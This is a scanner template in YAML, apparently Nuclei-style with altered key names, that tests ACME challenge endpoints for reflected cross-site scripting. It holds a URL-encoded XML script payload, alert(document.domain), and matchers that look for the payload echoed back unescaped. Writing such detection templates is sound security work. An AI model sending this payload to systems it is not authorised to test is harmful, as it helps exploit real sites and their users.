id: acme-xss
brief:
    title: Let's Encrypt - Cross-Site Scripting
    by: pdteam
    level: high
    about: Let's Encrypt contains a cross-site scripting vulnerability when using the the ACME protocol to issue SSL certificates.
    label:
        - xss
        - acme
        - vuln
    score: CVSS:7.2
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E'
      signs:
        - "on": word
          has:
            - <?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
          in: body
          need: all
        - "on": word
          has:
            - /xml
            - /html
          in: body
          need: all
